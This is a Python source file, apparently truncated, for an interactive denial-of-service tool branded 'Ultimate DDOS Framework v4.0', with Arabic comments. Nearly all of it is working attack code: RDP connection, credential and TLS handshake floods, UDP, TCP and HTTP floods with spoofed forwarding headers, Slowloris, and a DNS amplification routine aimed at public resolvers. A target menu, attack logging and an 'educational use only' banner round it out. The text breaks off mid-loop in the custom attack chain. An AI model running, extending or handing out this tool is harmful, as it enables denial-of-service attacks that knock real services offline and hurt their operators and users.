"""
# ============================================
# ULTIMATE DDOS FRAMEWORK v4.0
# Advanced Multi-Vector Attack Suite
# Educational Purposes Only
# ============================================
"""

import socket
import threading
import random
import time
import os
import sys
import struct
import ssl
import ipaddress
import json
import hashlib
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime

# ==================== CONFIGURATION ====================
VERSION = "4.0 Advanced"
MAX_THREADS = 50000
CONFIG_FILE = "ddos_config.json"

# ANSI Colors with better compatibility
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    
    # Background colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'

# Extended User-Agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
    'curl/8.4.0',
    'python-requests/2.31.0',
    'Go-http-client/2.0',
    'Java/1.8.0_351',
    'PostmanRuntime/7.36.0'
]

# Common ports for different services
SERVICE_PORTS = {
    'web': [80, 443, 8080, 8443],
    'rdp': [3389],
    'ssh': [22],
    'dns': [53],
    'ftp': [21],
    'smtp': [25, 587],
    'mysql': [3306],
    'mongodb': [27017],
    'redis': [6379],
    'elasticsearch': [9200]
}

# ==================== SECURITY & VALIDATION ====================
class SecurityValidator:
    """التحقق من صحة المدخلات والأهداف"""
    
    @staticmethod
    def validate_ip(target):
        """التحقق من صحة عنوان IP"""
        try:
            ipaddress.ip_address(target)
            return True
        except ValueError:
            try:
                # محاولة تحويل اسم النطاق إلى IP
                socket.gethostbyname(target)
                return True
            except:
                return False
    
    @staticmethod
    def is_reserved_ip(ip):
        """التحقق إذا كان IP محجوزاً (خاص أو داخلي)"""
        reserved_ranges = [
            '10.0.0.0/8',
            '172.16.0.0/12',
            '192.168.0.0/16',
            '127.0.0.0/8',
            '169.254.0.0/16',
            '224.0.0.0/4',
            '240.0.0.0/4'
        ]
        
        ip_obj = ipaddress.ip_address(ip)
        for range_str in reserved_ranges:
            if ip_obj in ipaddress.ip_network(range_str):
                return True
        return False
    
    @staticmethod
    def get_service_ports(service=None):
        """الحصول على منافذ خدمة محددة"""
        if service and service in SERVICE_PORTS:
            return SERVICE_PORTS[service]
        return []
    
    @staticmethod
    def generate_fake_ip():
        """توليد عناوين IP وهمية للطلب الموزع"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

# ==================== LOGGING SYSTEM ====================
class AttackLogger:
    """نظام تسجيل الهجمات"""
    
    def __init__(self):
        self.log_file = f"attack_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.logs = []
        
    def log_attack(self, attack_type, target, port, duration, packets, status):
        """تسجيل هجوم"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'attack_type': attack_type,
            'target': target,
            'port': port,
            'duration': duration,
            'packets_sent': packets,
            'status': status
        }
        
        self.logs.append(log_entry)
        
        # حفظ في الملف
        try:
            with open(self.log_file, 'w') as f:
                json.dump(self.logs, f, indent=2)
        except:
            pass
        
        # عرض في الكونسول
        print(f"{Colors.CYAN}[LOG] {attack_type} -> {target}:{port} | Packets: {packets:,} | Status: {status}{Colors.END}")
    
    def show_stats(self):
        """عرض إحصائيات الهجمات"""
        if not self.logs:
            print(f"{Colors.YELLOW}[*] No attack logs found{Colors.END}")
            return
        
        total_packets = sum(log['packets_sent'] for log in self.logs)
        successful = sum(1 for log in self.logs if log['status'] == 'completed')
        
        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ ATTACK STATISTICS ══════════{Colors.END}")
        print(f"{Colors.GREEN}Total Attacks:{Colors.END} {len(self.logs)}")
        print(f"{Colors.GREEN}Successful:{Colors.END} {successful}")
        print(f"{Colors.GREEN}Total Packets:{Colors.END} {total_packets:,}")
        print(f"{Colors.GREEN}Log File:{Colors.END} {self.log_file}")

# ==================== ADVANCED RDP ATTACKS ====================
class AdvancedRDPAttacks:
    """هجمات RDP متقدمة"""
    
    def __init__(self):
        self.rdp_versions = [
            b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00',
            b'\x03\x00\x00\x13\x0e\xd0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00',
            b'\x03\x00\x00\x2b\x0e\xd0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00'
        ]
    
    def rdp_multi_vector(self, target_ip, target_port=3389, duration=60):
        """هجوم متعدد المتجهات على RDP"""
        print(f"{Colors.BLUE}[+] Starting Multi-Vector RDP Attack{Colors.END}")
        
        start_time = time.time()
        stats = defaultdict(int)
        
        # تشغيل جميع هجمات RDP بالتوازي
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = {
                executor.submit(self.rdp_connection_flood, target_ip, target_port, duration): 'connection',
                executor.submit(self.rdp_credential_spam, target_ip, target_port, duration): 'credential',
                executor.submit(self.rdp_ssl_flood, target_ip, target_port, duration): 'ssl'
            }
            
            for future in as_completed(futures):
                attack_type = futures[future]
                try:
                    result = future.result()
                    stats[attack_type] = result
                except Exception as e:
                    print(f"{Colors.RED}[-] {attack_type} attack failed: {e}{Colors.END}")
        
        total = sum(stats.values())
        print(f"{Colors.GREEN}[+] RDP Attack Summary:{Colors.END}")
        for attack_type, count in stats.items():
            print(f"  {attack_type}: {count:,}")
        print(f"{Colors.GREEN}  Total: {total:,}{Colors.END}")
        
        return total
    
    def rdp_connection_flood(self, target_ip, target_port=3389, duration=60):
        """RDP Connection Flood محسن"""
        connections = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                # استخدام اتصالات متعددة بشكل متوازي
                for _ in range(10):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    # محاولة اتصال سريع
                    sock.connect_ex((target_ip, target_port))
                    
                    # إرسال إصدارات مختلفة من RDP
                    version = random.choice(self.rdp_versions)
                    sock.send(version)
                    
                    connections += 1
                    sock.close()
                
                # تحديث الإحصائيات
                if connections % 100 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.GREEN}[~] RDP Connections: {connections:,} ({connections/elapsed:.1f}/s){Colors.END}")
                    
            except Exception as e:
                connections += 1
                continue
        
        return connections
    
    def rdp_credential_spam(self, target_ip, target_port=3389, duration=60):
        """RDP Credential Spam متقدم"""
        attempts = 0
        start_time = time.time()
        
        # قاعدة بيانات أكبر لأسماء المستخدمين وكلمات المرور
        usernames = ['Administrator', 'admin', 'user', 'test', 'root', 'guest', 
                    'administrateur', 'Администратор', '管理員', '管理者']
        passwords = ['123456', 'password', 'admin', '1234', 'test', 'admin123',
                    'Password123', 'Welcome1', 'Changeme123', 'Qwerty123']
        
        while time.time() - start_time < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target_ip, target_port))
                
                # إرسال بيانات اتصال RDP أولية
                sock.send(random.choice(self.rdp_versions))
                
                # زيادة محاولات المصادقة
                for _ in range(3):
                    username = random.choice(usernames)
                    password = random.choice(passwords)
                    attempts += 1
                
                sock.close()
                
                if attempts % 20 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}[~] RDP Auth Attempts: {attempts:,} ({attempts/elapsed:.1f}/s){Colors.END}")
                    
            except:
                attempts += 3  # حساب 3 محاولات لكل اتصال فاشل
                continue
        
        return attempts
    
    def rdp_ssl_flood(self, target_ip, target_port=3389, duration=60):
        """RDP SSL/TLS Flood محسن"""
        handshakes = 0
        start_time = time.time()
        
        # تكوينات SSL مختلفة
        ssl_versions = [ssl.PROTOCOL_TLS, ssl.PROTOCOL_TLSv1_2, ssl.PROTOCOL_TLSv1_1]
        
        while time.time() - start_time < duration:
            try:
                # محاولات SSL متعددة بشكل متوازي
                for _ in range(5):
                    context = ssl.SSLContext(random.choice(ssl_versions))
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    raw_socket.settimeout(1)
                    raw_socket.connect((target_ip, target_port))
                    
                    # محاولة SSL handshake
                    ssl_socket = context.wrap_socket(raw_socket, server_hostname=target_ip)
                    handshakes += 1
                    ssl_socket.close()
                
                if handshakes % 50 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.PURPLE}[~] SSL Handshakes: {handshakes:,} ({handshakes/elapsed:.1f}/s){Colors.END}")
                    
            except:
                handshakes += 1
                continue
        
        return handshakes

# ==================== ADVANCED DDOS ATTACKS ====================
class UltimateAttacks:
    """هجمات DDOS متقدمة"""
    
    def __init__(self):
        self.logger = AttackLogger()
    
    def smart_attack(self, target_ip, target_port, duration=60):
        """هجوم ذكي يكتشف أفضل طريقة تلقائياً"""
        print(f"{Colors.BLUE}[+] Starting Smart Attack Detection{Colors.END}")
        
        # اختبار الهدف أولاً
        best_method = self.detect_best_method(target_ip, target_port)
        
        print(f"{Colors.GREEN}[+] Detected best method: {best_method}{Colors.END}")
        
        if best_method == "http":
            return self.http_advanced(target_ip, target_port, duration)
        elif best_method == "udp":
            return self.udp_advanced(target_ip, target_port, duration)
        elif best_method == "syn":
            return self.tcp_syn_advanced(target_ip, target_port, duration)
        else:
            return self.mixed_attack(target_ip, target_port, duration)
    
    def detect_best_method(self, target_ip, target_port):
        """اكتشاف أفضل طريقة هجوم"""
        try:
            # اختبار HTTP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.0\r\n\r\n")
            response = sock.recv(1024)
            sock.close()
            
            if b"HTTP" in response:
                return "http"
        except:
            pass
        
        try:
            # اختبار UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(b"test", (target_ip, target_port))
            sock.recvfrom(1024)
            sock.close()
            return "udp"
        except socket.timeout:
            return "syn"  # إذا كان UDP مفتوحاً لكن لا رد
        except:
            return "mixed"
    
    def udp_advanced(self, target_ip, target_port, duration=60):
        """UDP Flood متقدم جداً"""
        print(f"{Colors.BLUE}[+] Starting Advanced UDP Flood{Colors.END}")
        
        packets = 0
        start_time = time.time()
        
        # إنشاء أنواع مختلفة من الحزم
        packet_types = [
            lambda: os.urandom(512),  # حزم صغيرة سريعة
            lambda: os.urandom(1450), # حزم بحجم MTU
            lambda: b"X" * 2048,      # حزم كبيرة
            lambda: b"\x00" * 1024,   # حزم من الأصفار
            lambda: struct.pack("!H", random.randint(1, 65535)) * 512 # حزم منظمة
        ]
        
        # إنشاء عدة سوكتات لزيادة الأداء
        sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
        
        try:
            while time.time() - start_time < duration:
                # إرسال من جميع السوكتات بالتوازي
                for sock in sockets:
                    for _ in range(5):  # 5 حزم لكل سوكت
                        data = random.choice(packet_types)()
                        
                        # إرسال إلى منافذ متعددة
                        base_port = target_port if target_port else 80
                        for port_offset in range(0, 200, 10):
                            try:
                                sock.sendto(data, (target_ip, base_port + port_offset))
                                packets += 1
                            except:
                                break
                
                # تحديث الإحصائيات
                if packets % 5000 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.GREEN}[~] UDP Packets: {packets:,} ({packets/elapsed:.1f}/s){Colors.END}")
                    
        finally:
            for sock in sockets:
                sock.close()
        
        return packets
    
    def tcp_syn_advanced(self, target_ip, target_port, duration=60):
        """TCP SYN Flood متقدم"""
        print(f"{Colors.BLUE}[+] Starting Advanced SYN Flood{Colors.END}")
        
        packets = 0
        start_time = time.time()
        
        # عناوين IP وهمية للطلب الموزع
        fake_ips = [SecurityValidator.generate_fake_ip() for _ in range(100)]
        
        while time.time() - start_time < duration:
            try:
                # إنشاء مجموعة من السوكتات
                for _ in range(50):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    
                    # استخدام عنوان IP وهمي (في مستوى التطبيق فقط)
                    sock.connect_ex((target_ip, target_port))
                    packets += 1
                    
                    # إبقاء بعض الاتصالات مفتوحة
                    if random.random() < 0.1:  # 10% من الاتصانات تبقى مفتوحة
                        time.sleep(0.5)
                    else:
                        sock.close()
                
                if packets % 1000 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}[~] SYN Packets: {packets:,} ({packets/elapsed:.1f}/s){Colors.END}")
                    
            except:
                packets += 50
                continue
        
        return packets
    
    def http_advanced(self, target_ip, target_port, duration=60):
        """HTTP Flood متقدم"""
        print(f"{Colors.BLUE}[+] Starting Advanced HTTP Flood{Colors.END}")
        
        requests = 0
        start_time = time.time()
        
        # قائمة مسارات متنوعة
        paths = [
            '/', '/index.html', '/wp-admin/', '/api/v1/users',
            '/login', '/register', '/products', '/search?q=test',
            '/admin', '/dashboard', '/config', '/backup',
            '/phpmyadmin', '/mysql', '/sql', '/db'
        ]
        
        # رؤوس HTTP متنوعة
        headers_list = [
            {'X-Forwarded-For': SecurityValidator.generate_fake_ip()},
            {'X-Real-IP': SecurityValidator.generate_fake_ip()},
            {'CF-Connecting-IP': SecurityValidator.generate_fake_ip()},
            {},
        ]
        
        while time.time() - start_time < duration:
            try:
                # اتصالات HTTP متعددة بشكل متوازي
                for _ in range(20):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target_ip, target_port))
                    
                    # بناء طلب HTTP معقد
                    method = random.choice(['GET', 'POST', 'HEAD', 'PUT'])
                    path = random.choice(paths)
                    user_agent = random.choice(USER_AGENTS)
                    headers = random.choice(headers_list)
                    
                    http_request = f"{method} {path} HTTP/1.1\r\n"
                    http_request += f"Host: {target_ip}\r\n"
                    http_request += f"User-Agent: {user_agent}\r\n"
                    http_request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    http_request += f"Accept-Language: en-US,en;q=0.5\r\n"
                    http_request += f"Accept-Encoding: gzip, deflate\r\n"
                    http_request += f"Connection: keep-alive\r\n"
                    
                    # إضافة رؤوس إضافية
                    for header, value in headers.items():
                        http_request += f"{header}: {value}\r\n"
                    
                    http_request += "\r\n"
                    
                    # إضافة جسم للطلبات POST/PUT
                    if method in ['POST', 'PUT']:
                        http_request += f"content-length: 100\r\n\r\n"
                        http_request += "x" * 100
                    
                    sock.send(http_request.encode())
                    requests += 1
                    
                    # قراءة جزء من الرد
                    try:
                        sock.recv(1024)
                    except:
                        pass
                    
                    sock.close()
                
                if requests % 200 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.CYAN}[~] HTTP Requests: {requests:,} ({requests/elapsed:.1f}/s){Colors.END}")
                    
            except:
                requests += 20
                continue
        
        return requests
    
    def mixed_attack(self, target_ip, target_port, duration=60):
        """هجوم مختلط بجميع الطرق"""
        print(f"{Colors.BLUE}[+] Starting Mixed Multi-Vector Attack{Colors.END}")
        
        start_time = time.time()
        stats = defaultdict(int)
        
        # تقسيم المدة على أنواع الهجمات
        attack_duration = duration / 4
        
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = {
                executor.submit(self.udp_advanced, target_ip, target_port, attack_duration): 'udp',
                executor.submit(self.tcp_syn_advanced, target_ip, target_port, attack_duration): 'syn',
                executor.submit(self.http_advanced, target_ip, target_port, attack_duration): 'http',
                executor.submit(self.dns_amplification, target_ip, attack_duration): 'dns'
            }
            
            for future in as_completed(futures):
                attack_type = futures[future]
                try:
                    result = future.result()
                    stats[attack_type] = result
                except Exception as e:
                    print(f"{Colors.RED}[-] {attack_type} attack failed: {e}{Colors.END}")
        
        total = sum(stats.values())
        
        print(f"\n{Colors.GREEN}{Colors.BOLD}══════════ ATTACK SUMMARY ══════════{Colors.END}")
        for attack_type, count in stats.items():
            print(f"{Colors.YELLOW}{attack_type.upper():10}{Colors.END}: {count:,}")
        print(f"{Colors.GREEN}{Colors.BOLD}Total:{Colors.END} {total:,} packets/requests")
        
        return total
    
    def dns_amplification(self, target_ip, duration=60):
        """DNS Amplification Attack محسن"""
        print(f"{Colors.BLUE}[+] Starting DNS Amplification Attack{Colors.END}")
        
        # قائمة أكبر لخوادم DNS
        dns_servers = [
            '8.8.8.8', '8.8.4.4',          # Google
            '1.1.1.1', '1.0.0.1',          # Cloudflare
            '9.9.9.9', '149.112.112.112',  # Quad9
            '208.67.222.222', '208.67.220.220',  # OpenDNS
            '64.6.64.6', '64.6.65.6',      # Verisign
            '84.200.69.80', '84.200.70.40', # DNS.WATCH
            '8.26.56.26', '8.20.247.20',   # Comodo
            '195.46.39.39', '195.46.39.40' # SafeDNS
        ]
        
        packets = 0
        start_time = time.time()
        
        # أنواع استعلامات DNS مختلفة
        dns_queries = [
            # ANY query
            b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\xff\x00\x01',
            # TXT query (يعطي ردود كبيرة)
            b'\x12\x35\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x04spam\x06google\x03com\x00\x00\x10\x00\x01',
            # DNSKEY query
            b'\x12\x36\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x30\x00\x01'
        ]
        
        sockets = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(5)]
        
        try:
            while time.time() - start_time < duration:
                for sock in sockets:
                    for dns_server in random.sample(dns_servers, 3):
                        query = random.choice(dns_queries)
                        
                        # تزوير عنوان المصدر ليكون الهدف
                        # ملاحظة: هذا لن يعمل بدون صلاحيات خاصة
                        try:
                            sock.sendto(query, (dns_server, 53))
                            packets += 1
                        except:
                            continue
                
                if packets % 500 == 0:
                    elapsed = time.time() - start_time
                    print(f"{Colors.YELLOW}[~] DNS Packets: {packets:,} ({packets/elapsed:.1f}/s){Colors.END}")
                    
        finally:
            for sock in sockets:
                sock.close()
        
        return packets
    
    def slowloris_attack(self, target_ip, target_port=80, duration=60):
        """Slowloris Attack محسن"""
        print(f"{Colors.BLUE}[+] Starting Slowloris Attack{Colors.END}")
        
        connections = []
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                # إنشاء اتصالات جديدة
                while len(connections) < 500:  # الحد الأقصى للاتصالات المتزامنة
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((target_ip, target_port))
                        
                        # إرسال طلب HTTP غير مكتمل
                        request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n"
                        sock.send(request.encode())
                        connections.append(sock)
                    except:
                        break
                
                # إبقاء الاتصالات نشطة
                for sock in connections[:]:
                    try:
                        # إرسال رأس إضافي كل بضع ثوان
                        sock.send(b"User-Agent: Slowloris\r\n")
                        time.sleep(5)
                    except:
                        connections.remove(sock)
                        sock.close()
                
                print(f"{Colors.PURPLE}[~] Active connections: {len(connections)}{Colors.END}")
                time.sleep(1)
                
        finally:
            for sock in connections:
                sock.close()
        
        return len(connections)

# ==================== CONFIGURATION MANAGER ====================
class ConfigManager:
    """مدير التكوين"""
    
    @staticmethod
    def load_config():
        """تحميل الإعدادات"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        # الإعدادات الافتراضية
        return {
            'max_threads': 500,
            'default_duration': 30,
            'log_attacks': True,
            'auto_detect': True,
            'rate_limit': 1000  # حزمة/ثانية كحد أقصى
        }
    
    @staticmethod
    def save_config(config):
        """حفظ الإعدادات"""
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=2)
            return True
        except:
            return False

# ==================== MAIN CONTROLLER ====================
class UltimateDDOSController:
    """المتحكم الرئيسي المحسن"""
    
    def __init__(self):
        self.rdp = AdvancedRDPAttacks()
        self.attacks = UltimateAttacks()
        self.logger = AttackLogger()
        self.config = ConfigManager.load_config()
        self.running = False
        
    def show_banner(self):
        """عرض بانر جميل"""
        os.system('clear')
        banner = f"""
{Colors.BOLD}{Colors.RED}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   ██╗   ██╗██╗  ████████╗███╗   ███╗ █████╗ ████████╗███████╗║
║   ██║   ██║██║  ╚══██╔══╝████╗ ████║██╔══██╗╚══██╔══╝██╔════╝║
║   ██║   ██║██║     ██║   ██╔████╔██║███████║   ██║   █████╗  ║
║   ██║   ██║██║     ██║   ██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ║
║   ╚██████╔╝███████╗██║   ██║ ╚═╝ ██║██║  ██║   ██║   ███████╗║
║    ╚═════╝ ╚══════╝╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝║
║                                                               ║
║                  {VERSION} - Advanced Suite                    ║
║             Multi-Vector + AI-Powered Detection               ║
║                      Educational Use Only                     ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
        
        # عرض معلومات النظام
        print(f"{Colors.CYAN}[*] System Info:{Colors.END}")
        print(f"  Platform: {sys.platform}")
        print(f"  Python: {sys.version.split()[0]}")
        print(f"  Config: {CONFIG_FILE}")
        print()
    
    def show_menu(self):
        """عرض القائمة التفاعلية"""
        menu = f"""
{Colors.BOLD}{Colors.BLUE}══════════ MAIN MENU ══════════{Colors.END}

{Colors.GREEN}{Colors.BOLD}[RDP ATTACKS]{Colors.END}
{Colors.YELLOW}[1]{Colors.END} RDP Connection Flood
{Colors.YELLOW}[2]{Colors.END} RDP Credential Spam
{Colors.YELLOW}[3]{Colors.END} RDP SSL Handshake Flood
{Colors.YELLOW}[4]{Colors.END} RDP Multi-Vector Attack

{Colors.GREEN}{Colors.BOLD}[STANDARD ATTACKS]{Colors.END}
{Colors.YELLOW}[5]{Colors.END} UDP Flood (Advanced)
{Colors.YELLOW}[6]{Colors.END} TCP SYN Flood (Advanced)
{Colors.YELLOW}[7]{Colors.END} HTTP GET Flood (Advanced)
{Colors.YELLOW}[8]{Colors.END} Slowloris Attack
{Colors.YELLOW}[9]{Colors.END} DNS Amplification

{Colors.GREEN}{Colors.BOLD}[SMART ATTACKS]{Colors.END}
{Colors.YELLOW}[10]{Colors.END} Smart Auto-Detect Attack
{Colors.YELLOW}[11]{Colors.END} Mixed Multi-Vector Attack
{Colors.YELLOW}[12]{Colors.END} Custom Attack Chain

{Colors.GREEN}{Colors.BOLD}[TOOLS]{Colors.END}
{Colors.YELLOW}[13]{Colors.END} Show Attack Statistics
{Colors.YELLOW}[14]{Colors.END} Configuration Settings
{Colors.YELLOW}[15]{Colors.END} Target Scanner
{Colors.YELLOW}[16]{Colors.END} Quick Test Mode

{Colors.RED}{Colors.BOLD}[0]{Colors.END} Exit

{Colors.BOLD}Select option: {Colors.END}"""
        
        return input(menu)
    
    def get_target(self):
        """الحصول على معلومات الهدف مع تحسينات"""
        print(f"\n{Colors.BOLD}{Colors.BLUE}══════════ TARGET CONFIGURATION ══════════{Colors.END}")
        
        while True:
            target = input(f"{Colors.YELLOW}Target IP/Hostname: {Colors.END}").strip()
            
            if not SecurityValidator.validate_ip(target):
                print(f"{Colors.RED}[-] Invalid target!{Colors.END}")
                continue
            
            if SecurityValidator.is_reserved_ip(target):
                confirm = input(f"{Colors.YELLOW}[!] This appears to be a reserved IP. Continue? (y/n): {Colors.END}").lower()
                if confirm != 'y':
                    continue
            
            # محاولة تحويل hostname إلى IP
            try:
                target = socket.gethostbyname(target)
                print(f"{Colors.GREEN}[+] Resolved to: {target}{Colors.END}")
            except:
                pass
            
            break
        
        # اقتراح المنفذ بناء على الخدمة
        print(f"\n{Colors.YELLOW}Service type (optional):{Colors.END}")
        for i, service in enumerate(SERVICE_PORTS.keys(), 1):
            print(f"  {i}. {service}")
        
        service_choice = input(f"{Colors.YELLOW}Choose service (1-{len(SERVICE_PORTS)}) or press Enter: {Colors.END}").strip()
        
        if service_choice.isdigit() and 1 <= int(service_choice) <= len(SERVICE_PORTS):
            service = list(SERVICE_PORTS.keys())[int(service_choice)-1]
            default_port = SERVICE_PORTS[service][0]
            print(f"{Colors.GREEN}[+] Selected service: {service} (port {default_port}){Colors.END}")
        else:
            default_port = 80
        
        port = input(f"{Colors.YELLOW}Port (default {default_port}): {Colors.END}").strip()
        port = int(port) if port else default_port
        
        duration = input(f"{Colors.YELLOW}Duration (seconds, default {self.config['default_duration']}): {Colors.END}").strip()
        duration = int(duration) if duration else self.config['default_duration']
        
        threads = input(f"{Colors.YELLOW}Threads (default {self.config['max_threads']}): {Colors.END}").strip()
        threads = int(threads) if threads else self.config['max_threads']
        
        return target, port, duration, threads
    
    def run_attack(self, method, ip, port, duration, threads):
        """تشغيل الهجوم مع تحسينات"""
        print(f"\n{Colors.BOLD}{Colors.RED}══════════ STARTING ATTACK ══════════{Colors.END}")
        print(f"{Colors.YELLOW}│ Target:{Colors.END} {ip}:{port}")
        print(f"{Colors.YELLOW}│ Duration:{Colors.END} {duration}s")
        print(f"{Colors.YELLOW}│ Threads:{Colors.END} {threads}")
        print(f"{Colors.YELLOW}│ Method:{Colors.END} {self.get_method_name(method)}")
        print(f"{Colors.YELLOW}│ Start Time:{Colors.END} {datetime.now().strftime('%H:%M:%S')}")
        print(f"{Colors.RED}{Colors.BOLD}══════════════════════════════════════{Colors.END}")
        
        # العد التنازلي
        for i in range(3, 0, -1):
            print(f"{Colors.RED}[{i}]...{Colors.END}", end=' ', flush=True)
            time.sleep(1)
        print(f"{Colors.GREEN}GO!{Colors.END}\n")
        
        start_time = time.time()
        result = 0
        
        try:
            # تشغيل الهجوم المناسب
            if method == 1:
                result = self.rdp.rdp_connection_flood(ip, port, duration)
            elif method == 2:
                result = self.rdp.rdp_credential_spam(ip, port, duration)
            elif method == 3:
                result = self.rdp.rdp_ssl_flood(ip, port, duration)
            elif method == 4:
                result = self.rdp.rdp_multi_vector(ip, port, duration)
            elif method == 5:
                result = self.attacks.udp_advanced(ip, port, duration)
            elif method == 6:
                result = self.attacks.tcp_syn_advanced(ip, port, duration)
            elif method == 7:
                result = self.attacks.http_advanced(ip, port, duration)
            elif method == 8:
                result = self.attacks.slowloris_attack(ip, port, duration)
            elif method == 9:
                result = self.attacks.dns_amplification(ip, duration)
            elif method == 10:
                result = self.attacks.smart_attack(ip, port, duration)
            elif method == 11:
                result = self.attacks.mixed_attack(ip, port, duration)
            elif method == 12:
                result = self.custom_attack_chain(ip, port, duration)
            
            elapsed = time.time() - start_time
            
            # تسجيل الهجوم
            if self.config.get('log_attacks', True):
                self.logger.log_attack(
                    self.get_method_name(method),
                    ip, port, duration, result, 'completed'
                )
            
            # عرض النتائج
            print(f"\n{Colors.GREEN}{Colors.BOLD}══════════ ATTACK RESULTS ══════════{Colors.END}")
            print(f"{Colors.GREEN}✓ Attack completed successfully!{Colors.END}")
            print(f"{Colors.GREEN}│ Total packets/requests:{Colors.END} {result:,}")
            print(f"{Colors.GREEN}│ Time elapsed:{Colors.END} {elapsed:.1f}s")
            print(f"{Colors.GREEN}│ Average rate:{Colors.END} {result/elapsed:.1f}/s")
            print(f"{Colors.GREEN}│ End Time:{Colors.END} {datetime.now().strftime('%H:%M:%S')}")
            print(f"{Colors.GREEN}{Colors.BOLD}══════════════════════════════════════{Colors.END}")
            
        except KeyboardInterrupt:
            elapsed = time.time() - start_time
            print(f"\n{Colors.RED}[!] Attack interrupted by user{Colors.END}")
            
            if self.config.get('log_attacks', True):
                self.logger.log_attack(
                    self.get_method_name(method),
                    ip, port, elapsed, result, 'interrupted'
                )
        except Exception as e:
            elapsed = time.time() - start_time
            print(f"\n{Colors.RED}[-] Attack failed: {e}{Colors.END}")
            
            if self.config.get('log_attacks', True):
                self.logger.log_attack(
                    self.get_method_name(method),
                    ip, port, elapsed, result, 'failed'
                )
        
        return result
    
    def get_method_name(self, method):
        """الحصول على اسم الطريقة"""
        methods = {
            1: "RDP Connection Flood",
            2: "RDP Credential Spam",
            3: "RDP SSL Flood",
            4: "RDP Multi-Vector",
            5: "UDP Flood",
            6: "TCP SYN Flood",
            7: "HTTP Flood",
            8: "Slowloris",
            9: "DNS Amplification",
            10: "Smart Attack",
            11: "Mixed Attack",
            12: "Custom Attack Chain"
        }
        return methods.get(method, "Unknown")
    
    def custom_attack_chain(self, ip, port, duration):
        """سلسلة هجمات مخصصة"""
        print(f"{Colors.BLUE}[+] Configuring Custom Attack Chain{Colors.END}")
        
        attacks = []
        print(f"\n{Colors.YELLOW}Select attacks for the chain:{Colors.END}")
        print("1. UDP Flood")
        print("2. SYN Flood")
        print("3. HTTP Flood")
        print("4. Slowloris")
        print("5. RDP Attack")
        
        choices = input(f"{Colors.YELLOW}Enter attack numbers (e.g., 1,3,5): {Colors.END}").strip()
        
        for choice in choices.split(','):
